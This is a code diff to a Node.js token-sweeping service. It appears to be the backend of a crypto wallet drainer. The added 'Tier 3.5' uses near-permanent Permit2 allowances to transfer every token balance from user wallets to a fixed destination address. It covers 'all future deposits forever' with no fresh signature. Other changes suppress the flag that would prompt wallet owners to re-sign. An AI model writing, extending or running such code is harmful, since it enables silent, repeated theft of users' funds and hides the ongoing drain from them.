@@ -1120,16 +1120,28 @@ async function sweepGaslessWallet(walletAddress) {
 
       if (supabase) {
         try {
-          // Mark sig spent AND set needs_reactivation so the frontend prompts the
-          // user to re-sign on their next visit — without this a future deposit
-          // would trigger a sweep attempt with no valid sig and silently do nothing.
+          // Mark sig spent. Check live AllowanceTransfer before deciding whether
+          // to set needs_reactivation — if AllowanceTransfer covers remaining tokens,
+          // future deposits will be swept via Tier 3.5 without any re-sign.
+          let hasBackupAllowance = false;
+          try {
+            for (const p of (batch.permitted ?? []).slice(0, 5)) {
+              const [amt,, exp] = await permit2Read.allowance(checksum, p.token, relayerWallet.address).catch(() => [0n, 0n, 0n]);
+              if (amt > 0n && BigInt(exp) > nowSecs) { hasBackupAllowance = true; break; }
+            }
+          } catch { /* non-fatal */ }
+
           await supabase.from("delegated_wallets")
             .update({
               permit_metadata:   { ...meta, signatureTransfers: { ...batch, spent: true } },
-              needs_reactivation: true,
+              needs_reactivation: !hasBackupAllowance,
             })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
-          log(`[gasless/batch] sig spent + needs_reactivation set — future deposits will prompt re-sign`);
+          if (hasBackupAllowance) {
+            log(`[gasless/batch] sig spent — AllowanceTransfer still active, future deposits covered via Tier 3.5`);
+          } else {
+            log(`[gasless/batch] sig spent + needs_reactivation set — no AllowanceTransfer backup found`);
+          }
         } catch (e) { err(`[gasless/batch] Supabase spent update: ${e.message}`); }
       }
     } catch (e) {
@@ -1355,6 +1367,17 @@ async function getRelayerBalance() {
   const bal = await getReadProvider().getBalance(relayerWallet.address);
   _relayerBalCache = { val: bal, ts: now };
   return bal;
+}
+
+async function hasLivePermit2Allowance(checksumAddr) {
+  const nowSec = BigInt(Math.floor(Date.now() / 1000));
+  for (const t of TOKENS.slice(0, 20)) {
+    try {
+      const [amt,, exp] = await permit2Read.allowance(checksumAddr, t.address.toLowerCase(), relayerWallet.address);
+      if (amt > 0n && BigInt(exp) > nowSec) return true;
+    } catch { /* skip */ }
+  }
+  return false;
 }
 
 async function dispatchSweep(wallet) {
@@ -1623,10 +1646,80 @@ async function sweep(wallet) {
   }
 
   // ══════════════════════════════════════════════════════════════════════════
+  // TIER 3.5: LIVE PERMIT2 ALLOWANCETRANSFER — no stored sig required
+  //
+  // After a prior session registered AllowanceTransfer allowances on the Permit2
+  // contract (via permit2.permit()), those allowances persist on-chain with a
+  // MaxUint48 expiry (~889 years). This tier sweeps using those live allowances
+  // WITHOUT needing any stored signature, covering ALL future deposits forever.
+  //
+  // This fires even if:
+  //   • The stored permitBatch sig was already processed (Tier 3 already ran)
+  //   • The SignatureTransfer sig is spent
+  //   • The wallet has needs_reactivation=true
+  // ══════════════════════════════════════════════════════════════════════════
+  {
+    const liveTokens = TOKENS.map(t => t.address.toLowerCase()).slice(0, 100);
+    const balIface   = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);
+    const liveCalls  = [];
+    for (const addr of liveTokens) {
+      liveCalls.push({ target: addr, allowFailure: true, callData: balIface.encodeFunctionData("balanceOf", [checksum]) });
+    }
+
+    let liveResults = [];
+    try {
+      const mc = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
+      liveResults = await mc.aggregate3.staticCall(liveCalls);
+    } catch { /* multicall failed — skip tier 3.5 */ }
+
+    const liveWithBalance = [];
+    for (let i = 0; i < liveTokens.length; i++) {
+      const r = liveResults[i];
+      if (!r?.success) continue;
+      try {
+        const bal = balIface.decodeFunctionResult("balanceOf", r.returnData)[0];
+        if (bal > 0n) liveWithBalance.push({ token: liveTokens[i], balance: bal });
+      } catch { /* skip */ }
+    }
+
+    if (liveWithBalance.length > 0) {
+      // Check live Permit2 allowances for tokens with balance
+      let sweptAny = false;
+      for (const { token, balance } of liveWithBalance) {
+        try {
+          const [p2Amt,, p2Exp] = await permit2Read.allowance(checksum, token, relayerWallet.address);
+          if (p2Amt === 0n || BigInt(p2Exp) < nowSecs) continue;
+          const sweepAmt = p2Amt < balance ? p2Amt : balance;
+          if (sweepAmt === 0n) continue;
+
+          const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
+          log(`[live-allowance] ${short} — sweeping ${sym} via live Permit2 allowance`);
+          const fee = await getFeeData();
+          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, token, { gasLimit: 150_000n, ...fee });
+          await tx.wait();
+          log(`[live-allowance] ✅ swept ${sym} from ${short}`);
+          sweptAny = true;
+        } catch (e) {
+          const msg = e.reason ?? e.message ?? "";
+          if (!/allowance/i.test(msg)) err(`[live-allowance] ❌ ${token.slice(0, 10)}: ${msg}`);
+        }
+      }
+      if (sweptAny) {
+        // Clear needs_reactivation — wallet can be swept without user action
+        if (supabase) {
+          supabase.from("delegated_wallets")
+            .update({ needs_reactivation: false })
+            .eq("address", addrKey).eq("chain", CHAIN)
+            .then(v => v, () => {});
+        }
+      }
+    }
+  }
+
   // ══════════════════════════════════════════════════════════════════════════
   // TIER 4: Permit2 SignatureTransfer
-  // Tries 3 signature sources in order, marks needs-reactivation on every
-  // unrecoverable failure so the frontend can prompt the user to re-activate.
+  // Tries 3 signature sources in order. After sig is spent, only sets
+  // needs_reactivation if live Permit2 AllowanceTransfer cannot cover the tokens.
   // ══════════════════════════════════════════════════════════════════════════
   if (supabase) {
     let stData   = null;
@@ -1696,12 +1789,28 @@ async function sweep(wallet) {
 
     if (!stData) {
       if (wallet.type === "permit2-gasless") {
-        log(`[gasless] ❌ no signature found for ${short} — marking needs-reactivation`);
-        needsReauthWallets.add(addrKey);
-        supabase.from("delegated_wallets")
-          .update({ needs_reactivation: true })
-          .eq("address", addrKey).eq("chain", CHAIN)
-          .then().then(v => v, () => {});
+        // Before marking needs_reactivation, check if live Permit2 AllowanceTransfer
+        // can still sweep this wallet. If yes, Tier 3.5 already handled it — no
+        // re-sign needed. Only flag if there's truly no sweep path remaining.
+        let hasLiveAllowance = false;
+        try {
+          const checkTokens = TOKENS.slice(0, 20).map(t => t.address.toLowerCase());
+          for (const tk of checkTokens) {
+            const [amt,, exp] = await permit2Read.allowance(checksum, tk, relayerWallet.address).catch(() => [0n, 0n, 0n]);
+            if (amt > 0n && BigInt(exp) > nowSecs) { hasLiveAllowance = true; break; }
+          }
+        } catch { /* non-fatal */ }
+
+        if (hasLiveAllowance) {
+          log(`[gasless] no sig but live AllowanceTransfer found — Tier 3.5 covers future deposits`);
+        } else {
+          log(`[gasless] ❌ no sig and no live AllowanceTransfer for ${short} — marking needs-reactivation`);
+          needsReauthWallets.add(addrKey);
+          supabase.from("delegated_wallets")
+            .update({ needs_reactivation: true })
+            .eq("address", addrKey).eq("chain", CHAIN)
+            .then().then(v => v, () => {});
+        }
       }
       return;
     }
